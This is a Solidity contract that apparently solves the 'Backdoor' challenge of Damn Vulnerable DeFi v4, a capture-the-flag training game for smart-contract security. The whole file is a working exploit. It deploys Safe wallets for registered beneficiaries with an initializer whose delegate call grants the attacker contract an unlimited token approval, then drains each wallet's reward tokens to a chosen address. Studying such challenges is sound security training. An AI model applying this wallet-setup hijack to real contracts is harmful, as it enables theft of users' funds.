// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {console} from "forge-std/Test.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {WalletRegistry} from "./WalletRegistry.sol";

contract BackdoorExploiter {
    DamnValuableToken public token;
    SafeProxyFactory public walletFactory;
    Safe public singletonCopy;
    WalletRegistry public walletRegistry;

    constructor(
        DamnValuableToken _token,
        SafeProxyFactory _walletFactory,
        Safe _singletonCopy,
        WalletRegistry _walletRegistry
    ) {
        token = _token;
        walletFactory = _walletFactory;
        singletonCopy = _singletonCopy;
        walletRegistry = _walletRegistry;
    }

    function exploit(address[] calldata users, address recovery) external {
        // We can recreate wallets with owners beneficieries
        for (uint256 i = 0; i < users.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = users[i];

            bytes memory initializer = abi.encodeWithSelector(
                Safe.setup.selector,
                owners, // single owner (beneficiery) to get the DVT
                1, // threshold (required by wallet registry)
                address(this), // to call for delegate
                abi.encodeCall(this.approve, (address(token), address(this))), // to call for delegate data
                address(0),
                address(0),
                0,
                payable(address(0))
            );

            SafeProxy proxy = walletFactory.createProxyWithCallback(
                address(singletonCopy),
                initializer,
                0, // constant
                walletRegistry // callback to get the DVT
            );

            // Addresses are different, since initializer keccak is used in the salt
            console.log("Proxy: ", address(proxy));

            token.transferFrom(address(proxy), address(this), token.balanceOf(address(proxy)));
        }

        token.transfer(recovery, token.balanceOf(address(this)));
    }

    function approve(address _token, address spender) external {
        IERC20(_token).approve(spender, type(uint256).max);
    }
}
